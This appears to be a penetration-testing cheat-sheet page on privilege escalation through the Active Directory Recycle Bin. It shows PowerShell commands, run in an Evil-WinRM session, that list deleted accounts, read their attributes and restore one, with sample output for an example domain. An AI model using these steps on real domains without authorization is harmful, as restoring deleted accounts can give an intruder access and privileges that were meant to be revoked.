---
title: "AD Recycle Bin"
date: 2024-7-13
tags: ["Domain Controller", "AD Recycle Bin", "Active Directory", "Windows"]
---

### Privesc #1: Restore deleted AD account

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import AD module

```console
import-module activedirectory
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> import-module activedirectory
```

#### 2. Query all deleted objects within domain

```console
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

Deleted           : True
DistinguishedName : CN=Another User\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=example,DC=com
Name              : Another User
                    DEL:ebe15df5-e265-45ec-b7fc-359877217138
ObjectClass       : user
ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138
```

#### 3. Get all details for the deleted account

```console
Get-ADObject -filter { SAMAccountName -eq '<DELETED_USER>' } -includeDeletedObjects -property *
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Get-ADObject -filter { SAMAccountName -eq 'another.user' }
-includeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : example.com/Deleted Objects/Another User
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
CN                              : Another User
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
...[SNIP]...
```

#### 4. Restore the deleted account

```console
# Rename the target account to avoid user exists error
Restore-ADObject -Identity <OBJECT_GUID> -NewName '<NEW_USER>' -TargetPath 'CN=Users,DC=<EXAMPLE>,DC=<COM>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Restore-ADObject -Identity ebe15df5-e265-45ec-b7fc-359877217138 -NewName 'Another User2' -TargetPath 'CN=Users,DC=EXAMPLE,DC=COM'
```

{{< /tabcontent >}}
